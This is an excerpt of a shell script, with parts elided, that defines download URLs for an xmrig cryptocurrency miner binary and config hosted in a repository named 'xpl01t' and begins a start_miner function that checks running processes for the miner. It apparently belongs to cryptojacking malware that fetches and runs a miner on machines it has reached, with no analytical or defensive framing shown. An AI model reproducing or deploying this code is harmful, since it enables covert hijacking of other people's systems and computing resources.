...
MINER_URL="https://github.com/Jonutz123/xpl01t/raw/main/miner/xmrig_linux"
MINER_CONFIG_URL="https://raw.githubusercontent.com/Jonutz123/xpl01t/main/miner/config.json"
...
start_miner(){
    ...
    do
            output=$(cat /proc/$procid/cmdline| grep -a -E "xpl01t_xmrig")
            if [ ${#output} -eq 0 ]
            then
                    miner_found=1
            fi
